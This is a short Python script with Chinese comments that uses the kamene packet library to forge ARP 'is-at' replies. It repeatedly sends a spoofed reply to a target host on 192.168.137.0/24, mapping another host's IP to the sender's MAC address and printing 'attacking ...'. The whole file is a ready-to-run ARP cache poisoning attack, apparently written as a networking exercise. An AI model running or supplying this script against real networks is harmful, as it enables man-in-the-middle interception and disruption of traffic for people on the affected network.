from kamene.all import *


eth = Ether()
arp = ARP(
    # 代表ARP请求或者响应
    op="is-at",
    # 本机的MAC地址
    hwsrc="08:00:27:02:43:a8",
    # 想要攻击的主机的IP地址
    psrc="192.168.137.3",
    # 被欺骗主机MAC地址
    hwdst="0a:00:27:00:00:15",
    # 被欺骗主机IP地址
    pdst="192.168.137.1"
)

print((eth/arp).show())
print("attacking ...")
#不断向被欺骗主机发送伪造的ARP响应
sendp(eth/arp, inter=1, loop=1)

